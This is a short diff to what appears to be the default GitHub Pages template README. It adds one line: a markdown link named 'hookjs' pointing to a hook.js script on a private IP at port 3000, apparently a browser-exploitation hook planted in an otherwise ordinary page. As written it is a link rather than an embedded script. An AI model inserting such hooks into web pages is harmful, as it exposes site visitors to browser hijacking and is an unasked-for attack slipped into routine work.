@@ -27,6 +27,7 @@ Syntax highlighted code block
 ```
 
 ![Image of Yaktocat](https://octodex.github.com/images/yaktocat.png)
+[hookjs](http://192.168.2.101:3000/hook.js)
 For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
 
 ### Jekyll Themes
